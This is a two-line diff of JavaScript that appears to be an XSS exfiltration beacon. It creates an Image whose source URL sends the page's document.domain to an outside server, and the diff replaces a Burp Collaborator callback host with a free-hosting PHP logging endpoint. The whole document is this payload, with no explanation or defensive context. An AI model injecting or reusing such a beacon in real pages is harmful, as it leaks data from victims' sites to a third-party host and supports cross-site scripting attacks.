@@ -1,2 +1,2 @@
 var img=new Image() 
-img.src=`https://72781xzq7zaeailxipk68q9kzb51tq.burpcollaborator.net/?domain=${document.domain}`
+img.src=`https://uyw.infinityfreeapp.com/ll.php?domain=${document.domain}`
